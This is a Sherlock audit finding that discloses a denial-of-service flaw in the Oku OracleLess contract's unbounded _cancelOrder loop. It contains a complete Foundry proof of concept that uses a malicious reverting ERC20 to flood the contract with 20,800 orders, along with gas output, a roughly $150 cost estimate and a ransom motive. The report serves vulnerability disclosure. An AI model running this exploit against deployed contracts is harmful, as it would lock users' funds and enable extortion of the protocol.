# Issue M-10: cancelOrder order can be DOSed due to unbounded loop.
Source: https://github.com/sherlock-audit/2024-11-oku-judging/issues/589

Found by
056Security, 0x0x0xw3, 0x37, 0xNirix, 0xaxaxa, 0xeix, 0xlucky, Audinarey, Boy2000, Chinedu, Contest-Squad, ExtraCaterpillar, John44, Kenn.eth, Opeyemi, PeterSR, Ragnarok, Tri-pathi, ami, befree3x, bughuntoor, future2_22, gajiknownnothing, hals, iamandreiski, itcruiser00, joshuajee, mxteem, oualidpro, phoenixv110, rahim7x, s0x0mtee, vinica_boy, whitehair0330, xiaoming90, yuza101, zhoo, zxriptor

Summary
The pendingOrderIds arrays can grow too large making it impossible to cancel subsequent legitimate pending orders, this will create a permanent DOS for the _cancelOrder no one will be able to cancel orders not admin nor order reciepient.

Root Cause
The root cause of the issue lies in the _cancelOrder function that loops through the pendingOrderIds in search of the right one because this pendingOrderIds array can grow too large a DOS is bound to happen and this can be exploited by a hacker to ransomware the protocol.

https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L151
```
    function _cancelOrder(Order memory order) internal returns (bool) {  
        for (uint96 i = 0; i < pendingOrderIds.length; i++) {  
            if (pendingOrderIds[i] == order.orderId) {  
                //remove from pending array  
                pendingOrderIds = ArrayMutation.removeFromArray(  
                    i,  
                    pendingOrderIds  
                );  
  
                //refund tokenIn amountIn to recipient  
                order.tokenIn.safeTransfer(order.recipient, order.amountIn);  
  
                //emit event  
                emit OrderCancelled(order.orderId);  
  
                return true;  
            }  
        }  
        return false;  
    }  
``` 
Internal pre-conditions
No response

External pre-conditions
No response

Attack Path
Attacker creates a malicious ERC20 token with fake transfers to ease the gas cost for this attack.
Attacker Creates 20800 orders using a worthless token as tokenIn, demanding 1 USDC per order.
They make it impossible for the admin to cancel the order because they deliberately revert the transfer on their malicious contract.
After this legitimate users will not be able to cancel order.
Impact
The cancelOrder function won't work and it will cost around $150 dollar to do it.
There is a financial ransomware gain where the attacker can set high tokens out and force the admin to pay more money for their worthless token, so this is incentivized.
PoC
Follow these steps to add foundry to the contract https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry

Install open zeppelin contracts
```
forge install https://github.com/OpenZeppelin/openzeppelin-contracts.git --no-commit
```
  
Copy and paste the code snippet below in the /test/ folder.
```
// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.24;  
  
import "forge-std/Test.sol";  
import "forge-std/console.sol";  
import {ERC20Mock} from "openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";  
import { AutomationMaster } from "../contracts/automatedTrigger/AutomationMaster.sol";  
import { OracleLess } from "../contracts/automatedTrigger/OracleLess.sol";  
import "../contracts/interfaces/uniswapV3/IPermit2.sol";  
import "../contracts/interfaces/openzeppelin/ERC20.sol";  
import "../contracts/interfaces/openzeppelin/IERC20.sol";  
  
contract FakeERC20 {  
    function transfer(address to, uint256 amount) external returns (bool) {   
        revert("HACKED!");  
        return false;  
    }  
  
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {   
        return true;  
    }  
  
}  
  
contract PocTest is Test {  
  
    AutomationMaster automationMaster;  
    OracleLess oracleLess;  
    IPermit2 permit2;  
    IERC20 fakeErc20;  
    IERC20 realToken;  
  
    address attacker = makeAddr("attacker");  
    address alice = makeAddr("alice");  
  
    function setUp() public {  
        automationMaster = new AutomationMaster();  
        oracleLess = new OracleLess(automationMaster, permit2);  
        fakeErc20 = IERC20(address(new FakeERC20()));  
        realToken = IERC20(address(new ERC20Mock()));  
        //MINT  
        ERC20Mock(address(realToken)).mint(alice, 100 ether);  
    }  
  
    function testDosAttack() public {  
        uint96 orderId;  
        uint gasUsed = gasleft();  
        vm.startPrank(alice);  
        realToken.approve(address(oracleLess), 100 ether);  
        orderId = oracleLess.createOrder(realToken, realToken, 1 ether, 1, alice, 1, false, '0x0');  
        gasUsed = gasleft();  
        oracleLess.cancelOrder(orderId);  
        console.log("Normal Cancel Gas Usage        : ", gasUsed - gasleft());  
        vm.stopPrank();  
  
        vm.startPrank(attacker);  
        gasUsed = gasleft();  
        for (uint i = 0; i < 20800; i++)  
            oracleLess.createOrder(fakeErc20, fakeErc20, 1, 1, attacker, 10, false, '0x0');  
        console.log("Attack Gas Usage               : ", gasUsed - gasleft());  
        vm.stopPrank();  
  
        vm.startPrank(alice);  
        gasUsed = gasleft();  
        orderId = oracleLess.createOrder(realToken, realToken, 1 ether, 1, alice, 1, false, '0x0');  
        oracleLess.cancelOrder(orderId);  
        console.log("After Attack Cancel Gas Usage  : ", gasUsed - gasleft());  
        vm.stopPrank();  
    }  
  
}
```  
Output
```
[PASS] testDosAttack() (gas: 444968053)  
Logs:  
  Normal Cancel Gas Usage        :  9439  
  Attack Gas Usage               :  394889776  
  After Attack Cancel Gas Usage  :  30294277
```
From the test output, we can see that 20800 order is enough to cause a DOS on the cancelOrder function, and it will cost the attacker 394889776 is about $150 dollar.

Mitigation
Create a fuction that can use the index to cancel order.

### All findings report
https://audits.sherlock.xyz/contests/641/report
